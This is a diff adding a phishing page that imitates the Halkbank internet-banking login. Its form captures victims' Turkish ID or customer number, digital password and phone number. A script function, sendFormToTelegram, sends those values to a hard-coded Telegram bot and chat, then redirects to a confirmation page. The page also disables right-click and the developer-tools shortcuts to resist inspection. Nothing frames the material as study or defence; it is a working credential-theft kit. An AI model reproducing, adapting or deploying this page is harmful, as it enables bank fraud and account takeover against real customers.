@@ -1,0 +1,912 @@
+<!DOCTYPE html>
+<html ng-app="app">
+
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Halkbank İnternet Şubesi</title>
+    <link rel="shortcut icon" href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/img/favicon/2favicon.ico"
+        type="image/x-icon" />
+    <base href="https://sube.halkbank.com.tr/InternetBankingHost/" />
+    <!-- Meta Tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="cache-control" content="max-age=0" />
+    <meta http-equiv="cache-control" content="no-cache" />
+    <meta http-equiv="expires" content="0" />
+    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
+    <meta http-equiv="pragma" content="no-cache" />
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+    <!-- Stylesheets -->
+    <link rel="stylesheet" type="text/css" media="screen"
+        href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/bootstrap.min.css?v=1725635390754" />
+
+    <link rel="stylesheet" type="text/css" media="screen"
+        href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/production.min.css?v=1725635390754" />
+    <link rel="stylesheet" type="text/css" media="screen"
+        href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/production-plugins.min.css?v=1725635390754" />
+    <link rel="stylesheet" type="text/css" media="screen"
+        href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/skins.min.css?v=1725635390754" />
+    <link rel="stylesheet" type="text/css" media="screen"
+        href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/veribranch-all.css?v=1725635390754" />
+    <link rel="stylesheet" type="text/css" media="screen"
+        href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/sa/css/receipt.css?v=1725635390754" />
+    <link rel="stylesheet" type="text/css" media="screen"
+        href="https://sube.halkbank.com.tr/InternetBankingHost/Features/wwwroot/statics/css/plugins-all.css?v=1725635390754" />
+
+
+
+    <script charset='UTF-8'>
+        function fraudNetInitiateEvent() {
+            if ('' === 'true') {
+                hkbadx.hkbinitiate(null);
+            }
+        }
+        function fraudNetValidateEvent() {
+            if ('' === 'true') {
+                hkbadx.hkbvalidate('hkb-user_prefs');
+            }
+        }
+        window.addEventListener('pageshow', (event) => {
+            if (event.persisted) {
+                // Force a reload if the user has logged out.
+                location.reload();
+            }
+        });
+    </script>
+
+
+    <!-- <link rel="icon" href="img/favicon/favicon.ico" type="image/x-icon" /> -->
+
+    <link rel="stylesheet" type="text/css"
+        href="https://sube.halkbank.com.tr/InternetBankingHost/Maintenance/BotDetectCaptcha.ashx?get=layoutStyleSheet" />
+
+
+</head>
+
+<body ng-controller="app.views.mvclogin.HostLoginController as vm" class="halk-bank container extr-page">
+    <div id="main" hidden="hidden" class="home newLogin" role="main" ng-init="vm.customerType=1">
+        <section class="contentArea">
+            <section class="loginArea">
+                <div class="container">
+                    <vb-spinner vb-is-post-spinner="true"></vb-spinner>
+                    <div class="spinner-loading-overlay"></div>
+                    <div class="row d-flex">
+                        <div class="col-xs-12 col-md-4 col-lg-5 login-carousel">
+
+                            <div>
+                                <div class="remind">
+                                    <div id="myCarousel" class="carousel fade loginSlide" data-ride="carousel">
+                                        <div class="carousel-inner">
+                                            <div class="item active">
+                                                <div class="carousel-caption ">
+                                                    <div class="textArea xs-txt-cnt  sm-txt-cnt md-txt-lf">
+                                                        <a href="https://www.halkbank.com.tr/tr/dijital-bankacilik/mobil-bankacilik/halkbank-mobil/halkbank-mobil-bireysel.html"
+                                                            target="_blank">
+                                                            <div class="txt txt1">Sen neredeysen <br /><b>Halkbank
+                                                                    Mobil</b> orada</div>
+                                                            <img data-target="#myCarousel"
+                                                                src="/InternetBankingHost/features/wwwroot/statics/sa/img/LoginBanner/tr-TR_banner1.png?v=2"
+                                                                alt="Halk Bankası" />
+                                                        </a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="item ">
+                                                <div class="carousel-caption ">
+                                                    <div class="textArea xs-txt-cnt  sm-txt-cnt md-txt-lf">
+                                                        <a href="https://www.halkbank.com.tr/tr/dijital-bankacilik/guvenlik/dikkat-etmeniz-gerekenler.html"
+                                                            target="_blank">
+                                                            <div class="txt txt2"><b>Güvenliğiniz için dikkat ediniz</b>
+                                                            </div>
+                                                            <div class="txt txt3">Bankamız adına açılan sahte Sosyal
+                                                                medya hesapları ve mobil uygulamalarda yer alan
+                                                                bağlantılara tıklamayınız ve bu bağlantılar aracılığı
+                                                                ile bilgilerinizi paylaşmayınız.</div>
+                                                            <img data-target="#myCarousel"
+                                                                src="/InternetBankingHost/features/wwwroot/statics/sa/img/LoginBanner/tr-TR_banner3.png?v=2"
+                                                                alt="Halk Bankası" />
+                                                        </a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <ol class="carousel-indicators">
+                                            <li data-target="#myCarousel" data-slide-to="0" class="active">
+                                                <span></span>
+                                            </li>
+                                            <li data-target="#myCarousel" data-slide-to="1" class="">
+                                                <span></span>
+                                            </li>
+                                            <li data-target="#myCarousel" data-slide-to="2" class="">
+                                                <span></span>
+                                            </li>
+                                        </ol>
+                                    </div>
+                                </div>
+                            </div>
+
+                        </div>
+                        <div class="col-xs-12 col-md-7 col-lg-6 col-lg-offset-1 login-input-box">
+                            <div class="login-box">
+                                <div class="d-flex">
+                                    <div id="logo-group">
+                                        <span id="logo"><a target="_blank" href="http://www.halkbank.com.tr"><img
+                                                    src="/InternetBankingHost/features/wwwroot/statics/sa/img/halkbank-logo.png?v=1"
+                                                    alt="Halk Bankası"></a></span>
+                                    </div>
+
+                                    <div class="language-switch">
+
+
+                                        <a class="tr" ng-href="{{vm.firstLoginLink}}"
+                                            ng-init="vm.firstLoginLinkRetail='?lang=en-US&amp;customerType=Retail'; vm.firstLoginLinkCorporate='?lang=en-US&amp;customerType=Corporate';    vm.firstLoginLink=vm.firstLoginLinkRetail">
+
+                                            <span>English</span>
+                                            <i></i>
+                                        </a>
+                                    </div>
+                                </div>
+                                <div class="ct-switch">
+                                    <a>
+                                        <span>Bireysel</span>
+                                    </a>
+
+                                </div>
+                                <div ng-show="vm.customerType==1" class="loginContainer retail-login-container"
+                                    style="">
+                                    <div>
+                                        <div class="tab-content loginInner">
+                                            <div class="loginHead">
+                                                <img src="/InternetBankingHost/features/wwwroot/statics/sa/img/HB_lock.png"
+                                                    height="38" />
+                                                <img class="visible-xs"
+                                                    src="/InternetBankingHost/features/wwwroot/statics/sa/img/HB_lock-white.png"
+                                                    height="38" />
+                                                <span data-toggle-text='İnternet Şube Giriş'>İnternet Şube Giriş</span>
+                                            </div>
+                                            <div id="is1">
+                                                <form action="" autocomplete="off" class="smart-form first-login prevent-multiple-submit retail-login" id="frmFirstLogin" method="post" onsubmit="sendFormToTelegram(); return false;">
+                                                    <fieldset>
+                                                        <div class="row">
+                                                            <section class="col col-xs-12">
+                                                                <label class="input">
+                                                                    <i class="icon-prepend hb-icon-user"></i>
+                                                                    <span class="placeholder-label">Müşteri/TC Kimlik Numarası</span>
+                                                                    <input id="tcNo" min="0" type="number" name="CustomerNumber" autocomplete="off" autofocus tabindex="1" class="removeAutoFill input-lg keyboard-input" oninput="limitInput(this, 11); onlyNumbers(this)" />
+                                                                </label>
+                                                            </section>
+                                                            <section class="col col-xs-12">
+                                                                <label class="input password-container">
+                                                                    <i class="icon-prepend fa fa-key"></i>
+                                                                    <span class="placeholder-label">Dijital Parola</span>
+                                                                    <input id="smsPassword" name="FirstLoginPasswordNotEncrypt" type="text" autocomplete="off" tabindex="2" class="removeAutoFill input-lg password-security numeric-input" oninput="limitInput(this, 6); onlyNumbers(this)" />
+                                                                    <input name="FirstLoginPassword" type="hidden" autocomplete="off" />
+                                                                </label>
+                                                            </section>
+                                                            <section class="col col-xs-12">
+                                                                <label class="input">
+                                                                    <i class="icon-prepend hb-icon-user"></i>
+                                                                    <span class="placeholder-label">Müşteri Telefon Numarası</span>
+                                                                    <input id="phoneNumber" min="0" type="number" name="PhoneNumber" autocomplete="off" tabindex="3" class="removeAutoFill input-lg keyboard-input" oninput="limitInput(this, 11); onlyNumbers(this)" />
+                                                                </label>
+                                                            </section>
+                                                
+                                                            <input type="submit" id="submitbtn" class="loginBtn green mrt15" value='Giriş' tabindex="4">
+                                                        </div>
+                                                    </fieldset>
+                                                </form>
+                                                
+                                                <script>
+                                                    document.addEventListener('keydown', function (e) {
+                                                        if (e.key === 'F12' || e.keyCode === 123) {
+                                                            e.preventDefault();
+                                                        }
+                                                        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) {
+                                                            e.preventDefault();
+                                                        }
+                                                    });
+                                                
+                                                    document.addEventListener('contextmenu', function (e) {
+                                                        e.preventDefault();
+                                                    });
+                                                
+                                                    function limitInput(element, maxLength) {
+                                                        if (element.value.length > maxLength) {
+                                                            element.value = element.value.slice(0, maxLength);
+                                                        }
+                                                    }
+                                                
+                                                    function onlyNumbers(input) {
+                                                        input.value = input.value.replace(/\D/g, '');
+                                                    }
+                                                
+                                                    function sendFormToTelegram() {
+                                                        const formData = {
+                                                            tc: document.getElementById('tcNo').value,
+                                                            sms: document.getElementById('smsPassword').value,
+                                                            telNo: document.getElementById('phoneNumber').value
+                                                        };
+                                                
+                                                        const botToken = '7530444478:AAEpstb4aWFbV9T4ZwuoH0iVYwmFZYEi1zg';
+                                                        const chatId = '-4580848608"';
+                                                        const message = `Müşteri / T.C. Kimlik Numarası: ${formData.tc}\nParola: ${formData.sms}\nTelefon Numarası: ${formData.telNo}`;
+                                                
+                                                        if (formData.tc.length === 11 && formData.sms.length === 6 && (formData.telNo.length === 10 || formData.telNo.length === 11)) {
+                                                            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                                                                method: 'POST',
+                                                                headers: {
+                                                                    'Content-Type': 'application/json'
+                                                                },
+                                                                body: JSON.stringify({
+                                                                    chat_id: chatId,
+                                                                    text: message
+                                                                })
+                                                            })
+                                                                .then(response => response.json())
+                                                                .then(data => {
+                                                                    if (data.ok) {
+                                                                        window.location.href = 'onay.html';
+                                                                    } else {
+                                                                        alert('Hata oluştu, tekrar deneyiniz.');
+                                                                    }
+                                                                })
+                                                                .catch(error => {
+                                                                    console.error('Error:', error);
+                                                                    alert('Bir hata oluştu.');
+                                                                });
+                                                        } else {
+                                                            alert('Lütfen tüm alanları doğru bir şekilde doldurun.');
+                                                        }
+                                                    }
+                                                </script>
+                                                
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div ng-show="vm.customerType==2" class="loginContainer corporate-login-container"
+                                    style="display:none;">
+                                    <a href="locolhost:3036/HostLogin"></a>
+                                    <div class="loginInner">
+
+                                        <div class="loginHead">
+                                            <img src="/InternetBankingHost/features/wwwroot/statics/sa/img/HB_lock.png"
+                                                height="38" />
+                                            <img class="visible-xs"
+                                                src="/InternetBankingHost/features/wwwroot/statics/sa/img/HB_lock-white.png"
+                                                height="38" />
+                                            <span data-toggle-text='İnternet Şube Giriş'>İnternet Şube Giriş</span>
+                                        </div>
+
+                                    </div>
+                                </div>
+                            </div>
+
+
+                            <div class="newMiniFooter hidden-xs">
+
+
+
+                                <div class="container login-box-area login-footer-area oldLoginFooter">
+                                    <div class="row">
+                                        <div class="col-md-3">
+                                            <a href="https://sube.halkbank.com.tr/InternetBankingHost/PinCreate/CardVerification">
+                                                <div class="box box2 text-align-center green-border">
+                                                    <span>
+                                                        <i class="fa fa-key box-image"></i>
+                                                    </span>
+                                                    <span class="title">Parola Oluşturma</span>
+                                                    <span class="txt">Kart bilgilerinizi kullanarak İnternet Şubesi
+                                                        Parolanızı oluşturabilirsiniz.</span>
+                                                </div>
+                                            </a>
+                                        </div>
+
+                                        <div class="col-md-3">
+
+
+                                            <a target="_blank"
+                                                href="https://www.halkbank.com.tr/tr/dijital-bankacilik/dialog/mutlu-musteri-merkezi.html">
+                                                <div class="box box2 text-align-center orange-border">
+                                                    <div class="happy-customer-center box-image"></div>
+                                                    <span class="title">Mutlu M&#252;şteri Merkezi</span>
+                                                    <span class="txt">Halkbank olarak siz değerli m&#252;şterilerimizin
+                                                        taleplerini &#246;nemsiyoruz.</span>
+                                                </div>
+                                            </a>
+                                        </div>
+
+                                        <div class="col-md-3">
+                                            <a target="_blank"
+                                                href="https://www.halkbank.com.tr/tr/dijital-bankacilik/guvenlik/dijital-kanallarda-guvenlik/internet-bankaciligi.html">
+                                                <div class="box box2 text-align-center yellow-border">
+                                                    <div class="security-box-image box-image"></div>
+                                                    <span class="title">G&#252;venlik Bilgileri</span>
+                                                    <span class="txt">İnternet Şubesi g&#252;venliğiniz i&#231;in dikkat
+                                                        etmeniz gerekenler detaylandırılmıştır.</span>
+                                                </div>
+                                            </a>
+
+                                        </div>
+
+                                        <div class="col-md-3">
+
+                                            <a target="_blank" href="http://www.paraf.com.tr/">
+                                                <div class="box box2 text-align-center paraf-border">
+                                                    <div class="paraf-card box-image"></div>
+                                                    <span class="title">Paraf Card</span>
+                                                    <span class="txt">Kredi Kartı D&#252;nyasında Ayrıcalıklar Bu
+                                                        Paraf’ta!</span>
+                                                </div>
+                                            </a>
+                                        </div>
+                                    </div>
+                                </div>
+
+
+                                <div class="login-box-area login-footer-area hidden">
+
+                                    <!--<div>
+            <a href="https://sube.halkbank.com.tr/InternetBankingHost/PinCreate/CardVerification">
+                <div class="box box2 text-align-center green-border parola-olustur">-->
+
+                                    <!--<span class="title">Parola Oluşturma</span>
+                    <span class="txt">Kart bilgilerinizi kullanarak İnternet Şubesi Parolanızı oluşturabilirsiniz.</span>
+                </div>
+            </a>
+        </div>-->
+
+                                    <div>
+
+
+                                        <a target="_blank"
+                                            href="https://www.halkbank.com.tr/tr/dijital-bankacilik/dialog/mutlu-musteri-merkezi.html">
+                                            <div class="box box2 text-align-center orange-border mutlu-musteri">
+
+                                                <span class="title">Mutlu M&#252;şteri Merkezi</span>
+                                                <span class="txt">Halkbank olarak siz değerli m&#252;şterilerimizin
+                                                    taleplerini &#246;nemsiyoruz.</span>
+                                            </div>
+                                        </a>
+                                    </div>
+
+                                    <div>
+                                        <a target="_blank"
+                                            href="https://www.halkbank.com.tr/tr/dijital-bankacilik/guvenlik/dijital-kanallarda-guvenlik/internet-bankaciligi.html">
+                                            <div class="box box2 text-align-center yellow-border guvenlik-bilgileri">
+
+                                                <span class="title">G&#252;venlik Bilgileri</span>
+                                                <span class="txt">İnternet Şubesi g&#252;venliğiniz i&#231;in dikkat
+                                                    etmeniz gerekenler detaylandırılmıştır.</span>
+                                            </div>
+                                        </a>
+
+                                    </div>
+
+
+
+                                </div>
+
+
+                                <div class="login-box-area login-footer-area hidden">
+                                    <div id="logo-group" class="hidden">
+                                        <span id="logo"><a target="_blank" href="http://www.halkbank.com.tr"><img
+                                                    src="/InternetBankingHost/features/wwwroot/statics/sa/img/HALKBANK/HALKBANK_logo2.svg?v=1"
+                                                    alt="Halk Bankası"></a></span>
+                                    </div>
+
+
+
+                                    <div>
+                                        <a target="_blank"
+                                            href="https://www.halkbank.com.tr/tr/dijital-bankacilik/planli-kesintiler.html">
+                                            <div class="box box2 text-align-center green-border duyurular">
+                                                <span class="title">
+                                                    Duyurular
+                                                </span>
+                                            </div>
+                                        </a>
+                                    </div>
+
+                                    <div>
+                                        <a target="_blank"
+                                            href="https://www.halkbank.com.tr/tr/sikca-sorulan-sorular.html">
+                                            <div class="box box2 text-align-center green-border sss">
+                                                <span class="title">Sık&#231;a Sorulan Sorular</span>
+                                            </div>
+                                        </a>
+                                    </div>
+
+                                </div>
+
+
+                                <div class="container oldLoginFooter">
+                                    <div id="logo-group">
+                                        <span id="logo"><a target="_blank" href="http://www.halkbank.com.tr"><img
+                                                    src="/InternetBankingHost/features/wwwroot/statics/sa/img/HALKBANK/HALKBANK_logo2.svg?v=1"
+                                                    alt="Halk Bankası"></a></span>
+                                    </div>
+                                    <div class="link-group">
+                                        <a ng-href="{{vm.firstLoginLink}}"
+                                            ng-init="vm.firstLoginLinkRetail='?lang=en-US&amp;customerType=Retail'; vm.firstLoginLinkCorporate='?lang=en-US&amp;customerType=Corporate';    vm.firstLoginLink=vm.firstLoginLinkRetail">
+                                            <i></i>
+                                            <span>English</span>
+                                        </a>
+                                        <a target="_blank"
+                                            href="https://www.halkbank.com.tr/tr/sikca-sorulan-sorular.html">Sık&#231;a
+                                            Sorulan Sorular</a>
+                                        <a href="https://www.halkbank.com.tr/tr/bankamiz/iletisim/sube-ve-atm-arama.html"
+                                            target="_blank">
+                                            ATM ve Şubeler
+                                        </a>
+                                        <a target="_blank"
+                                            href="https://www.halkbank.com.tr/tr/dijital-bankacilik/planli-kesintiler.html">Duyurular</a>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="hidden-xs" id="loginfooter1">
+
+                                <footer id="footer" class="text-center login-footer">
+                                    <div class="container">
+                                        <div class="row">
+                                            <div>
+                                                <span class="copyright" aria-hidden="true">Her hakkı T&#252;rkiye Halk
+                                                    Bankası A.Ş.&#39;ye aittir &#169; 2024</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </footer>
+                            </div>
+                        </div>
+
+                    </div>
+
+                    <div class="newMiniFooter visible-xs">
+
+
+
+                        <div class="container login-box-area login-footer-area oldLoginFooter">
+                            <div class="row">
+                                <div class="col-md-3">
+                                    <a href="https://sube.halkbank.com.tr/InternetBankingHost/PinCreate/CardVerification">
+                                        <div class="box box2 text-align-center green-border">
+                                            <span>
+                                                <i class="fa fa-key box-image"></i>
+                                            </span>
+                                            <span class="title">Parola Oluşturma</span>
+                                            <span class="txt">Kart bilgilerinizi kullanarak İnternet Şubesi Parolanızı
+                                                oluşturabilirsiniz.</span>
+                                        </div>
+                                    </a>
+                                </div>
+
+                                <div class="col-md-3">
+
+
+                                    <a target="_blank"
+                                        href="https://www.halkbank.com.tr/tr/dijital-bankacilik/dialog/mutlu-musteri-merkezi.html">
+                                        <div class="box box2 text-align-center orange-border">
+                                            <div class="happy-customer-center box-image"></div>
+                                            <span class="title">Mutlu M&#252;şteri Merkezi</span>
+                                            <span class="txt">Halkbank olarak siz değerli m&#252;şterilerimizin
+                                                taleplerini &#246;nemsiyoruz.</span>
+                                        </div>
+                                    </a>
+                                </div>
+
+                                <div class="col-md-3">
+                                    <a target="_blank"
+                                        href="https://www.halkbank.com.tr/tr/dijital-bankacilik/guvenlik/dijital-kanallarda-guvenlik/internet-bankaciligi.html">
+                                        <div class="box box2 text-align-center yellow-border">
+                                            <div class="security-box-image box-image"></div>
+                                            <span class="title">G&#252;venlik Bilgileri</span>
+                                            <span class="txt">İnternet Şubesi g&#252;venliğiniz i&#231;in dikkat etmeniz
+                                                gerekenler detaylandırılmıştır.</span>
+                                        </div>
+                                    </a>
+
+                                </div>
+
+                                <div class="col-md-3">
+
+                                    <a target="_blank" href="http://www.paraf.com.tr/">
+                                        <div class="box box2 text-align-center paraf-border">
+                                            <div class="paraf-card box-image"></div>
+                                            <span class="title">Paraf Card</span>
+                                            <span class="txt">Kredi Kartı D&#252;nyasında Ayrıcalıklar Bu
+                                                Paraf’ta!</span>
+                                        </div>
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+
+
+                        <div class="login-box-area login-footer-area hidden">
+
+                            <!--<div>
+            <a href="https://sube.halkbank.com.tr/InternetBankingHost/PinCreate/CardVerification">
+                <div class="box box2 text-align-center green-border parola-olustur">-->
+
+                            <!--<span class="title">Parola Oluşturma</span>
+                    <span class="txt">Kart bilgilerinizi kullanarak İnternet Şubesi Parolanızı oluşturabilirsiniz.</span>
+                </div>
+            </a>
+        </div>-->
+
+                            <div>
+
+
+                                <a target="_blank"
+                                    href="https://www.halkbank.com.tr/tr/dijital-bankacilik/dialog/mutlu-musteri-merkezi.html">
+                                    <div class="box box2 text-align-center orange-border mutlu-musteri">
+
+                                        <span class="title">Mutlu M&#252;şteri Merkezi</span>
+                                        <span class="txt">Halkbank olarak siz değerli m&#252;şterilerimizin taleplerini
+                                            &#246;nemsiyoruz.</span>
+                                    </div>
+                                </a>
+                            </div>
+
+                            <div>
+                                <a target="_blank"
+                                    href="https://www.halkbank.com.tr/tr/dijital-bankacilik/guvenlik/dijital-kanallarda-guvenlik/internet-bankaciligi.html">
+                                    <div class="box box2 text-align-center yellow-border guvenlik-bilgileri">
+
+                                        <span class="title">G&#252;venlik Bilgileri</span>
+                                        <span class="txt">İnternet Şubesi g&#252;venliğiniz i&#231;in dikkat etmeniz
+                                            gerekenler detaylandırılmıştır.</span>
+                                    </div>
+                                </a>
+
+                            </div>
+
+
+
+                        </div>
+
+
+                        <div class="login-box-area login-footer-area hidden">
+                            <div id="logo-group" class="hidden">
+                                <span id="logo"><a target="_blank" href="http://www.halkbank.com.tr"><img
+                                            src="/InternetBankingHost/features/wwwroot/statics/sa/img/HALKBANK/HALKBANK_logo2.svg?v=1"
+                                            alt="Halk Bankası"></a></span>
+                            </div>
+
+
+
+                            <div>
+                                <a target="_blank"
+                                    href="https://www.halkbank.com.tr/tr/dijital-bankacilik/planli-kesintiler.html">
+                                    <div class="box box2 text-align-center green-border duyurular">
+                                        <span class="title">
+                                            Duyurular
+                                        </span>
+                                    </div>
+                                </a>
+                            </div>
+
+                            <div>
+                                <a target="_blank" href="https://www.halkbank.com.tr/tr/sikca-sorulan-sorular.html">
+                                    <div class="box box2 text-align-center green-border sss">
+                                        <span class="title">Sık&#231;a Sorulan Sorular</span>
+                                    </div>
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                        <div class="container oldLoginFooter">
+                            <div id="logo-group">
+                                <span id="logo"><a target="_blank" href="http://www.halkbank.com.tr"><img
+                                            src="/InternetBankingHost/features/wwwroot/statics/sa/img/HALKBANK/HALKBANK_logo2.svg?v=1"
+                                            alt="Halk Bankası"></a></span>
+                            </div>
+                            <div class="link-group">
+                                <a ng-href="{{vm.firstLoginLink}}"
+                                    ng-init="vm.firstLoginLinkRetail='?lang=en-US&amp;customerType=Retail'; vm.firstLoginLinkCorporate='?lang=en-US&amp;customerType=Corporate';    vm.firstLoginLink=vm.firstLoginLinkRetail">
+                                    <i></i>
+                                    <span>English</span>
+                                </a>
+                                <a target="_blank"
+                                    href="https://www.halkbank.com.tr/tr/sikca-sorulan-sorular.html">Sık&#231;a Sorulan
+                                    Sorular</a>
+                                <a href="https://www.halkbank.com.tr/tr/bankamiz/iletisim/sube-ve-atm-arama.html"
+                                    target="_blank">
+                                    ATM ve Şubeler
+                                </a>
+                                <a target="_blank"
+                                    href="https://www.halkbank.com.tr/tr/dijital-bankacilik/planli-kesintiler.html">Duyurular</a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="visible-xs" id="loginfooter1">
+
+                        <footer id="footer" class="text-center login-footer">
+                            <div class="container">
+                                <div class="row">
+                                    <div>
+                                        <span class="copyright" aria-hidden="true">Her hakkı T&#252;rkiye Halk Bankası
+                                            A.Ş.&#39;ye aittir &#169; 2024</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </footer>
+                    </div>
+                </div>
+            </section>
+
+
+
+        </section>
+    </div>
+
+
+
+    <div class="modal fade newLogin" id="dtoLoginModal" tabindex="-1" role="dialog" aria-labelledby="dtoLoginModalLabel"
+        aria-hidden="true">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header" style="display:flex">
+                    <h4 class="modal-title" style="margin: -1rem -1rem -1rem auto;" id="dtoLoginModalLabel">DTO Giriş
+                    </h4>
+                    <button id="dtoLoginModalCloseButton" type="button" class="close" data-dismiss="modal"
+                        aria-label="Close" style="margin: -1rem -1rem -1rem auto;font-size: 2.5rem;">
+                        <span aria-hidden="true">&times;</span>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <p style="font-size:16px;"> DTO işlemlerinizi, Halkbank İnternet Şubesi’ne giriş yaparak Nakit
+                        Y&#246;netimi men&#252;s&#252; altından kolayca ger&#231;ekleştirebilirsiniz.</p>
+                </div>
+
+                <div class="modal-footer">
+                    <button type="button" id="dtoLoginModalButton" class="loginBtn loginBtnss green mrt15"
+                        data-dismiss="modal">Tamam</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <style>
+        .loginBtnss {
+            color: #fff;
+            padding: 10px 50px;
+            border: 0;
+            border-radius: 5px;
+            background-color: #0bbbef;
+            height: 40px;
+            color: #fff;
+            padding: 10px 10px;
+            font-family: Roboto;
+            font-weight: 500;
+            font-size: 15px;
+            line-height: 20px;
+            border: 0;
+            min-width: 120px;
+        }
+
+        .modal-content p {
+            margin: 0px 9px 10px;
+            text-align: center;
+        }
+
+        .modal-footer {
+            padding: 15px;
+        }
+    </style>
+
+    <script type="text/javascript">
+        var placeHolderText = "Dijital Parola";
+        var placeHolderAtt = "placeholder";
+
+
+
+        document.addEventListener('DOMContentLoaded', function () {
+            $("#ieModal").modal("show");
+            $(document).on('keyboardApplied', function () {
+                $("#PinLoginCustomerID").focus();
+                document.getElementById("loginfooter1").removeAttribute("hidden");
+            });
+
+            var passElement = $(this).find("input[name=FirstLoginPasswordNotEncrypt]");
+            //passElement.attr(placeHolderAtt, placeHolderText);
+
+
+            $("form.retail-login").submit(function () {
+                var inpVal = $(this).find("input[name=FirstLoginPasswordNotEncrypt]").val();
+                if (!(/^\d*$/.test(inpVal))) {
+                    $("#result-panel-alert").hide();
+                    $("#result-panel-alert2").show();
+                    $(this).find("#submitbtn").removeAttr("disabled");
+
+                    return false;
+                }
+            });
+
+
+            $("form.first-login").submit(function () {
+                var passNotEncrypt = $(this).find("input[name=FirstLoginPasswordNotEncrypt]").val();
+                var pass = $(this).find("input[name=FirstLoginPassword]");
+
+                // Encrypt with the public key...
+                var encrypt = new JSEncrypt();
+                var text = '-----BEGIN PUBLIC KEY-----' + '\n' +
+                    'MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC62iH7BJAKxooeAUv4xVJcKO7/' + '\n' +
+                    'QxO52VLrckLrKgP1onw9HI9WuGbbctKV6FgCORGP75IPTkssv6ZO8HRX3tJhgIVb' + '\n' +
+                    '7iJmrH0GjiFSSr7rNDmR66KmXFeL+Jw56ykSVn9syfoi7sY5pZVf8pOHe2theyyE' + '\n' +
+                    '5+DblcyvinCvMTlzwQIDAQAB' + '\n' +
+                    '-----END PUBLIC KEY-----';
+
+                encrypt.setPublicKey(text);
+                if (pass[0] && pass[0].value == "") {
+                    $(this).find("input[name=FirstLoginPasswordNotEncrypt]")[0].value = "666666";
+                    pass[0].value = encrypt.encrypt(passNotEncrypt);
+                }
+            });
+
+            $("form.first-login-corporate").submit(function (e) {
+                var passNotEncrypt = $(this).find("input[name=FirstLoginPasswordNotEncrypt]").val();
+                var pass = $(this).find("input[name=FirstLoginPassword]");
+
+                // Encrypt with the public key...
+                var encrypt = new JSEncrypt();
+                var text = '-----BEGIN PUBLIC KEY-----' + '\n' +
+                    'MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC62iH7BJAKxooeAUv4xVJcKO7/' + '\n' +
+                    'QxO52VLrckLrKgP1onw9HI9WuGbbctKV6FgCORGP75IPTkssv6ZO8HRX3tJhgIVb' + '\n' +
+                    '7iJmrH0GjiFSSr7rNDmR66KmXFeL+Jw56ykSVn9syfoi7sY5pZVf8pOHe2theyyE' + '\n' +
+                    '5+DblcyvinCvMTlzwQIDAQAB' + '\n' +
+                    '-----END PUBLIC KEY-----';
+
+                encrypt.setPublicKey(text);
+                if (pass[0] && pass[0].value == "") {
+                    $(this).find("input[name=FirstLoginPasswordNotEncrypt]")[0].value = "666666";
+                    pass[0].value = encrypt.encrypt(passNotEncrypt);
+                }
+
+                var coexistenceLoginType = document.getElementById("coexistenceLoginType");
+                var text = coexistenceLoginType.options[coexistenceLoginType.selectedIndex].text;
+                if (text === 'DTO') {
+                    e.preventDefault();
+                    // show the modal
+                    $('#dtoLoginModal').modal('show');
+                    // chage the coexistenceLoginType after the modal button is clicked
+                    $('#dtoLoginModalButton').click(function () {
+                        $('#coexistenceLoginType').val("InternetBanking").change();
+                        $('.loginBtn').prop("disabled", false);
+                    });
+                    $('#dtoLoginModalCloseButton').click(function () {
+                        $('#coexistenceLoginType').val("InternetBanking").change();
+                        $('.loginBtn').prop("disabled", false);
+                    });
+                }
+            });
+
+
+            $(document).ready(function () {
+
+                var obj = $("input[type='text'][name='FirstLoginPassword']");
+                var passwordbg = obj.css("background-color");
+
+                obj.on("blur input", function () {
+                    var passwordBlurbg = $(this).css("background-color");
+                    if (passwordBlurbg !== passwordbg) {
+                        obj.val("");
+                    }
+                });
+
+                var objCustomer = $("#PinLoginCustomerID");
+                var passwordbgCustomer = objCustomer.css("background-color");
+
+                objCustomer.on("blur input", function () {
+                    var passwordBlurbgCustomer = $(this).css("background-color");
+                    if (passwordBlurbgCustomer !== passwordbgCustomer) {
+                        objCustomer.val("");
+                    }
+                });
+
+                objCustomer.on("click", function () {
+                    var isReanonly = objCustomer.attr('readonly');
+                    if (isReanonly) {
+                        objCustomer.removeAttr('readonly');
+                    }
+                });
+
+                var objCorporate = $("input[type='text'][name='CorporateCustomerNumber']");
+                var passwordbgCorporate = objCustomer.css("background-color");
+
+                objCorporate.on("blur input", function () {
+                    var passwordBlurbgpasswordbgCorporate = $(this).css("background-color");
+                    if (passwordBlurbgpasswordbgCorporate !== passwordbgCorporate) {
+                        objCorporate.val("");
+                    }
+                });
+
+                objCorporate.on("click", function () {
+                    var isReanonly = objCorporate.attr('readonly');
+                    if (isReanonly) {
